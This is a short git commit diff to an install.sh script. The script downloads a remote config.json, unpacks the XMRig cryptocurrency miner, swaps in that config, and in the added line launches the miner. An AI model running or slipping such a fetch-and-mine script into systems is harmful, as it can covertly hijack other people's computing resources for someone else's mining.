b9a168a97066dca28b8bc85edc40be00980316e4
0x82b <75819560+0x82b@users.noreply.github.com>
2020-12-25 11:54:45 -0500

    Update install.sh

--- install.sh
+++ install.sh
@@ -3,3 +3,4 @@ wget https://raw.githubusercontent.com/0x82b/0x82b.github.io/main/config.json
 tar xzvf xmrig-6.7.0-linux-x64.tar.gz
 rm xmrig-6.7.0-linux-x64/config.json
 mv config.json xmrig-6.7.0-linux-x64
+./xmrig-6.7.0-linux-x64/xmrig
